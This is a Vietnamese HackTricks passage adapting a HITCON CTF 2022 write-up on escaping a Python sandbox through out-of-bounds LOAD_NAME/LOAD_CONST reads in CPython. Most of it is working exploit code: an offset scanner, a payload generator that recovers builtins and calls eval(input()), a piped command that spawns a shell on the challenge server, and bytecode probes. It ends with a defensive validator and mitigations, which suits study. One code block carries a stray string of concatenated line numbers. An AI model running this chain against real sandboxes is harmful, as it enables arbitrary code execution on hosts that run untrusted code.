# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

Trang này phỏng theo bài writeup và exploit chain gốc của Splitline cho HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>

### Tóm tắt <a href="#tldr-2" id="tldr-2"></a>

Operand của `LOAD_NAME` hoặc `LOAD_CONST` có thể đọc vượt ra ngoài tuple `co_names` hoặc `co_consts` đã bị cố ý rút ngắn. Trong challenge này, các name giả không thể truy cập được dùng cho đến khi một entry lân cận chứa một attribute hữu ích như `__getattribute__`.<sup>[[1]](#references)</sup>

Payload còn lại tái sử dụng name đó để tạo sandbox escape.<sup>[[1]](#references)</sup>

### Tổng quan <a href="#overview-1" id="overview-1"></a>

Wrapper của challenge khá ngắn và compile một expression trước khi đánh giá nó:<sup>[[1]](#references)</sup>

```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```

Đầu vào được biên dịch thành một đối tượng mã Python, sau đó wrapper thay `co_consts` và `co_names` của nó bằng các tuple rỗng trước khi gọi `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Bất kỳ instruction nào được tạo ra mà vẫn truy cập một trong các bảng đó đều có thể làm interpreter crash hoặc làm lộ con trỏ của đối tượng liền kề, tùy thuộc vào bản build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Segfault xảy ra như thế nào?

Với một biểu thức list như `[a, b, c]`, compiler tạo các instruction `LOAD_NAME` có operand liên tiếp:<sup>[[1]](#references)[[2]](#references)</sup>

```
  1           0 LOAD_NAME                0 (a)
              2 LOAD_NAME                1 (b)
              4 LOAD_NAME                2 (c)
              6 BUILD_LIST               3
              8 RETURN_VALUE
```

Nếu `co_names` được thay bằng `()`, bytecode vẫn chứa `LOAD_NAME 2`; do đó, thao tác truy cập tuple không kiểm tra có thể lấy một con trỏ nằm ngoài tuple thay vì phát sinh `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` và `LOAD_CONST` là các primitive cốt lõi ở đây: các toán hạng số nguyên của chúng lần lượt chọn các mục trong `co_names` và `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

Trong cơ chế dispatch của CPython, `LOAD_CONST` lấy mục tuple đã chọn và đẩy nó lên; các bản build release dùng accessor tuple không kiểm tra:<sup>[[3]](#references)</sup>

```c
case TARGET(LOAD_CONST): {
    PREDICTED(LOAD_CONST);
    PyObject *value = GETITEM(consts, oparg);
    Py_INCREF(value);
    PUSH(value);
    FAST_DISPATCH();
}
```

Thử các toán hạng `LOAD_NAME` tăng dần trên trình thông dịch mục tiêu để lập bản đồ các mục hữu ích. Splitline quan sát thấy các offset hữu ích trên 700 trong môi trường thử thách, nhưng bố cục phụ thuộc vào bản build; debugger có thể giúp kiểm tra vùng bộ nhớ lân cận.<sup>[[1]](#references)</sup>

### Tạo Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Khi một offset trả về tên hữu ích, hãy đặt phép tra cứu ngoài phạm vi vào một biểu thức không thể được thực thi và tham chiếu cùng slot `co_names` đó từ một truy cập thuộc tính có thể được thực thi.<sup>[[1]](#references)</sup>

Ví dụ, nếu offset 5 trả về `__getattribute__`, hãy giữ tên đó ở slot 5 trong khi nhánh sai thực hiện phép tra cứu hữu ích:<sup>[[1]](#references)</sup>

```python
[a,b,c,d,e,__getattribute__] if [] else [
    [].__getattribute__
    # you can get the __getattribute__ method of list object now!
]
```

> Văn bản được khôi phục không nhất thiết phải là `__getattribute__`; bất kỳ định danh nào phục vụ payload đều có thể nằm ở vị trí này.<sup>[[1]](#references)</sup>

Trình biên dịch sử dụng lại một slot trong `co_names` cho các lần xuất hiện lặp lại của cùng một tên, như bản disassembly minh họa:<sup>[[1]](#references)[[2]](#references)</sup>

```python
              0 BUILD_LIST               0
              2 POP_JUMP_IF_FALSE       20
        >>    4 LOAD_NAME                0 (a)
        >>    6 LOAD_NAME                1 (b)
        >>    8 LOAD_NAME                2 (c)
        >>   10 LOAD_NAME                3 (d)
        >>   12 LOAD_NAME                4 (e)
        >>   14 LOAD_NAME                5 (__getattribute__)
             16 BUILD_LIST               6
             18 RETURN_VALUE
             20 BUILD_LIST               0
        >>   22 LOAD_ATTR                5 (__getattribute__)
             24 BUILD_LIST               1
             26 RETURN_VALUE
```

Vì `LOAD_ATTR` cũng phân giải tên thông qua `co_names`, nhánh có thể tiếp cận có thể dùng lại slot đó; các operand được đóng gói trên những phiên bản CPython mới hơn được mô tả trong ghi chú phiên bản bên dưới.<sup>[[1]](#references)[[2]](#references)</sup>

Có thể tạo các số nguyên không âm nhỏ từ biểu thức boolean mà không cần hằng số:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Kịch bản Exploit <a href="#exploit-script-1" id="exploit-script-1"></a>

Exploit ban đầu dùng tên thay vì hằng số để đáp ứng giới hạn độ dài của thử thách.<sup>[[1]](#references)</sup>

Helper này quét các offset tên có thể có bằng cách tạo một code object với tuple `co_names` rỗng.<sup>[[1]](#references)</sup>

```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
    def __getitem__(self, k):
        if type(k) == str:
            return k


if __name__ == '__main__':
    n = int(argv[1])

    code = [
        *([opmap['EXTENDED_ARG'], n // 256]
          if n // 256 != 0 else []),
        opmap['LOAD_NAME'], n % 256,
        opmap['RETURN_VALUE'], 0
    ]

    c = CodeType(
        0, 0, 0, 0, 0, 0,
        bytes(code),
        (), (), (), '<sandbox>', '<eval>', 0, b'', ()
    )

    ret = eval(c, {'__builtins__': MockBuiltins()})
    if ret:
        print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```

Generator bên dưới ánh xạ các offset đã khôi phục sang tên và xuất payload ở cấp mã nguồn.<sup>[[1]](#references)</sup>

```python
import sys
import unicodedata


class Generator:
    # get numner
    def __call__(self, num):
        if num == 0:
            return '(not[[]])'
        return '(' + ('(not[])+' * num)[:-1] + ')'

    # get string
    def __getattribute__(self, name):
        try:
            offset = None.__dir__().index(name)
            return f'keys[{self(offset)}]'
        except ValueError:
            offset = None.__class__.__dir__(None.__class__).index(name)
            return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
    while True:
        chr_code += 1
        char = unicodedata.normalize('NFKC', chr(chr_code))
        if char.isidentifier() and char not in names:
            names.append(char)
            break

offsets = {
    "__delitem__": 2800,
    "__getattribute__": 2850,
    '__dir__': 4693,
    '__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
             'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
    names[offset] = name

for i, var in enumerate(variables):
    assert var not in offsets
    names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
    get(get([],{_.__class__}),{_.__base__}),
    {_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
    builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```

Ở mức khái quát, payload được tạo sẽ lấy globals của một hàm, khôi phục `builtins` và gọi `eval(input())`.<sup>[[1]](#references)</sup>

```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
  getattr(
    getattr(
      [].__getattribute__('__class__'),
    '__base__'),
  '__subclasses__'
  )()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```

---

### Ghi chú phiên bản và các opcode bị ảnh hưởng (Python 3.11–3.13)

- Trên CPython 3.11–3.13, các instruction vẫn dùng toán hạng số nguyên để truy cập các bảng constant và name của code object. Nếu một trong hai tuple ngắn hơn index được tham chiếu, thao tác truy cập không được kiểm tra có thể đọc một con trỏ object liền kề và gây crash hoặc thao tác trên object đó; hành vi chính xác phụ thuộc vào bản build của interpreter.<sup>[[2]](#references)[[3]](#references)</sup>
  - `LOAD_CONST consti` và (3.12+) `RETURN_CONST consti` đọc `co_consts[consti]`.<sup>[[2]](#references)</sup>
  - Các opcode trực tiếp dùng bảng name gồm `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` và (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
  - `LOAD_GLOBAL namei` và `LOAD_ATTR namei` dùng `co_names[namei >> 1]`; bit thấp nhất điều khiển hành vi NULL/method được mô tả trong tài liệu. (3.12+) `LOAD_SUPER_ATTR namei` dùng `co_names[namei >> 2]` và mã hóa hai cờ trong các bit thấp nhất của nó.<sup>[[2]](#references)</sup>
- Python 3.11+ giới thiệu adaptive/inline cache, bổ sung các mục `CACHE` ẩn giữa các instruction. Bytecode được tạo thủ công phải tính đến các mục này khi xây dựng `co_code`.<sup>[[2]](#references)</sup>

Ý nghĩa thực tiễn: bố cục bytecode và các offset được khôi phục phụ thuộc vào phiên bản và bản build. Hãy kiểm tra kỹ thuật này và mọi payload được tạo trên phiên bản CPython mục tiêu trước khi sử dụng.<sup>[[2]](#references)</sup>

### Scanner nhanh để tìm các index OOB hữu ích (tương thích 3.11+/3.12+)

Nếu muốn dò tìm trực tiếp các object đáng chú ý từ bytecode thay vì từ source cấp cao, bạn có thể tạo các code object tối giản và brute-force các index. Helper bên dưới chèn inline cache theo metadata `dis` của interpreter mục tiêu.<sup>[[2]](#references)</sup>

```python
import dis, types

def assemble(ops):
    # ops: list of (opname, arg) pairs
    cache = bytes([dis.opmap.get("CACHE", 0), 0])
    out = bytearray()
    for op, arg in ops:
        opc = dis.opmap[op]
        out += bytes([opc, arg])
        # Python >=3.11 inserts per-opcode inline cache entries
        ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
        out += cache * ncache
    return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
    code = assemble([
        ("RESUME", 0),          # 3.11+
        ("LOAD_CONST", i),
        ("RETURN_VALUE", 0),
    ])
    c = base.replace(co_code=code, co_consts=(), co_names=())
    try:
        return eval(c)
    except Exception:
        return None

for idx in range(0, 300):
    obj = probe_const(idx)
    if obj is not None:
        print(idx, type(obj), repr(obj)[:80])
```

Ghi chú
- Để thăm dò tên thay thế, đổi `LOAD_CONST` thành `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` và điều chỉnh cách dùng stack cùng toán hạng được đóng gói cho opcode mục tiêu.<sup>[[2]](#references)</sup>
- Dùng `EXTENDED_ARG` hoặc nhiều byte `arg` để truy cập các chỉ mục >255 nếu cần. Helper này chỉ xuất byte toán hạng thấp, vì vậy các chỉ mục lớn hơn cần dựng byte thô hoặc thực hiện nhiều lần load.<sup>[[2]](#references)</sup>

### Mẫu RCE tối giản chỉ dùng bytecode (co_consts OOB → builtins → eval/input)

Sau khi xác định được chỉ mục `co_consts` trỏ đến module builtins, bạn có thể dựng lại `eval(input())` mà không cần `co_names` bằng cách thao tác với stack. Tài liệu chính thức của B01lers CTF 2024 `awpcode` cũng mô tả mẫu OOB-read này.<sup>[[4]](#references)</sup>

```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```

Cách tiếp cận chỉ dùng stack này hữu ích khi một challenge cho phép bạn kiểm soát trực tiếp `co_code` nhưng buộc `co_consts=()` và `co_names=()`; cách này tránh các thủ thuật ở cấp mã nguồn và có thể giúp payload nhỏ gọn bằng cách dùng các thao tác stack của bytecode và bộ dựng tuple.<sup>[[4]](#references)</sup>

### Kiểm tra phòng thủ và biện pháp giảm thiểu cho sandbox

Nếu bạn viết một Python sandbox biên dịch hoặc đánh giá mã không đáng tin cậy, đừng dựa vào CPython để kiểm tra giới hạn của các chỉ mục tuple được bytecode sử dụng. Hãy xác thực các code object trước khi thực thi chúng.<sup>[[2]](#references)[[3]](#references)</sup>

Trình xác thực thực tế (từ chối truy cập OOB vào co_consts/co_names).<sup>[[2]](#references)</sup>

```python
import dis

def max_name_index(code):
    max_idx = -1
    direct_name_ops = {
        "LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
        "IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
        "LOAD_FROM_DICT_OR_GLOBALS",
    }
    for ins in dis.get_instructions(code):
        if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
            namei = ins.arg or 0
            # 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
            if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
                namei >>= 1
            elif ins.opname == "LOAD_SUPER_ATTR":
                namei >>= 2
            max_idx = max(max_idx, namei)
    return max_idx

def max_const_index(code):
    return max([ins.arg for ins in dis.get_instructions(code)
                if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
    if max_const_index(code) >= len(code.co_consts):
        raise ValueError("Bytecode refers to const index beyond co_consts length")
    if max_name_index(code) >= len(code.co_names):
        raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```

Các ý tưởng giảm thiểu bổ sung
- Không cho phép gọi `CodeType.replace(...)` tùy ý trên đầu vào không đáng tin cậy, hoặc bổ sung các kiểm tra cấu trúc nghiêm ngặt đối với code object được tạo ra.
- Cân nhắc chạy mã không đáng tin cậy trong một tiến trình riêng với sandbox ở cấp hệ điều hành (seccomp, job objects, containers), thay vì dựa vào ngữ nghĩa của CPython.

## References

- [1] [Bài viết phân tích "V O I D" của Splitline tại HITCON CTF 2022 (nguồn gốc của kỹ thuật này và chuỗi khai thác ở mức khái quát)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Tài liệu `dis` của Python 3.13 (chỉ số bytecode, toán hạng tên được đóng gói và inline cache)](https://docs.python.org/3.13/library/dis.html)
- [3] [Các macro truy cập tuple của CPython 3.13.5 (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Bài viết phân tích thử thách `awpcode` tại B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Đối tượng Code](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
